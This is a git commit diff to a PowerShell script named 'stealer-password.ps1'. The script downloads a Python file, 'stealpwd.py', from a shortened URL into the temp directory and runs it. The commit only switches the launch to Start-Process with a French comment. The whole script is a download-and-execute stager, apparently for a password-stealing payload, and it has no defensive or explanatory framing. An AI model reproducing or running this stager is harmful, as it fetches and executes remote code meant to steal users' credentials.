ad138603a49b3c0a0890f1dd4cfc25a45774d721
xborz75 <103429301+xborz75@users.noreply.github.com>
2024-05-11 17:28:41 +0200

    Update stealer-password.ps1

--- stealer-password.ps1
+++ stealer-password.ps1
@@ -1,3 +1,5 @@
 $WebClient = New-Object System.Net.WebClient
 $WebClient.DownloadFile("https://rebrand.ly/iab05iw", "$env:temp\stealpwd.py")
-python3 "$env:temp\stealpwd.py"
+
+# Exécuter le script Python dans une fenêtre de console
+Start-Process -FilePath "python3" -ArgumentList "$env:temp\stealpwd.py" -Wait
